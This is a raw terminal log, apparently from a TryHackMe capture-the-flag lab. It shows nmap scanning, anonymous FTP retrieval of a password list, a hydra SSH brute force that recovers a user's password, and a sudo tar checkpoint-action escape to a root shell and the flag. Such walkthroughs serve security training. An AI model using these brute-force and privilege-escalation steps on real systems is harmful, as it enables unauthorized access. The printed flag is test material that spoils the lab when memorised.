@@ -1,0 +1,184 @@
+└─$ cat nmap_full.txt 
+# Nmap 7.95 scan initiated Sun Jul 13 22:53:19 2025 as: /usr/lib/nmap/nmap --privileged -sV -v -T4 -p- -oN nmap_full.txt 10.10.129.151
+Nmap scan report for 10.10.129.151
+Host is up (0.063s latency).
+Not shown: 55529 filtered tcp ports (no-response), 10003 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Jul 13 22:54:42 2025 -- 1 IP address (1 host up) scanned in 82.97 seconds
+
+
+
+
+Spike, Jet, Ed, Faye
+
+
+
+
+└─$ ftp anonymous@10.10.129.151
+Connected to 10.10.129.151.
+220 (vsFTPd 3.0.3)
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+
+229 Entering Extended Passive Mode (|||25132|)
+
+
+
+┌──(kali㉿kali)-[~/github/tryhackme/cowboyhacker/enumeration]
+└─$ lftp anonymous@10.10.129.151
+
+Password: 
+lftp anonymous@10.10.129.151:~> ls                
+Interrupt                                
+lftp anonymous@10.10.129.151:/> set ftp:passive-mode off
+lftp anonymous@10.10.129.151:/> ls
+-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
+-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
+lftp anonymous@10.10.129.151:/> get locks.txt
+418 bytes transferred                              
+lftp anonymous@10.10.129.151:/> get task.txt
+68 bytes transferred                              
+lftp anonymous@10.10.129.151:/> bye
+
+
+┌──(kali㉿kali)-[~/github/tryhackme/cowboyhacker/enumeration]
+└─$ cat ../files/locks.txt 
+rEddrAGON
+ReDdr4g0nSynd!cat3
+Dr@gOn$yn9icat3
+R3DDr46ONSYndIC@Te
+ReddRA60N
+R3dDrag0nSynd1c4te
+dRa6oN5YNDiCATE
+ReDDR4g0n5ynDIc4te
+R3Dr4gOn2044
+RedDr4gonSynd1cat3
+R3dDRaG0Nsynd1c@T3
+Synd1c4teDr@g0n
+reddRAg0N
+REddRaG0N5yNdIc47e
+Dra6oN$yndIC@t3
+4L1mi6H71StHeB357
+rEDdragOn$ynd1c473
+DrAgoN5ynD1cATE
+ReDdrag0n$ynd1cate
+Dr@gOn$yND1C4Te
+RedDr@gonSyn9ic47e
+REd$yNdIc47e
+dr@goN5YNd1c@73
+rEDdrAGOnSyNDiCat3
+r3ddr@g0N
+ReDSynd1ca7e
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/github/tryhackme/cowboyhacker/enumeration]
+└─$ cat ../files/task.txt 
+1.) Protect Vicious.
+2.) Plan for Red Eye pickup on the moon.
+
+-lin
+
+
+
+┌──(kali㉿kali)-[~/github/tryhackme/cowboyhacker/enumeration]
+└─$ hydra -l lin -P ../files/locks.txt ssh://10.10.129.151 -t 4 -v 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-13 23:06:38
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
+[DATA] attacking ssh://10.10.129.151:22/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[INFO] Testing if password authentication is supported by ssh://lin@10.10.129.151:22
+[INFO] Successful, password authentication is supported by ssh://10.10.129.151:22
+[22][ssh] host: 10.10.129.151   login: lin   password: RedDr4gonSynd1cat3
+[STATUS] attack finished for 10.10.129.151 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-13 23:06:45
+
+login: lin
+password: RedDr4gonSynd1cat3
+
+
+
+lin@bountyhacker:~/Desktop$ uname -a
+Linux bountyhacker 4.15.0-101-generic #102~16.04.1-Ubuntu SMP Mon May 11 11:38:16 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+
+
+
+
+lin@bountyhacker:~/Desktop$ find / -perm -4000 -type f 2>/dev/null | sort
+
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/ping6
+/bin/su
+/bin/umount
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
+/usr/lib/xorg/Xorg.wrap
+/usr/sbin/pppd
+
+
+
+lin@bountyhacker:~$ sudo -l
+[sudo] password for lin: 
+
+Sorry, try again.
+[sudo] password for lin: 
+Sorry, try again.
+[sudo] password for lin: 
+Matching Defaults entries for lin on bountyhacker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lin may run the following commands on bountyhacker:
+    (root) /bin/tar
+
+
+
+
+lin@bountyhacker:~$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar: Removing leading `/' from member names
+# whoami
+root
+# cd /root/
+# ls -al
+total 40
+drwx------  5 root root 4096 Jun  7  2020 .
+drwxr-xr-x 24 root root 4096 Jun  6  2020 ..
+-rw-------  1 root root 2694 Jun  7  2020 .bash_history
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+drwx------  2 root root 4096 Feb 26  2019 .cache
+drwxr-xr-x  2 root root 4096 Jun  7  2020 .nano
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   19 Jun  7  2020 root.txt
+-rw-r--r--  1 root root   66 Jun  7  2020 .selected_editor
+drwx------  2 root root 4096 Jun  7  2020 .ssh
+# cat root.txt  
+THM{80UN7Y_h4cK3r}
+
+
+
+
+
+
+
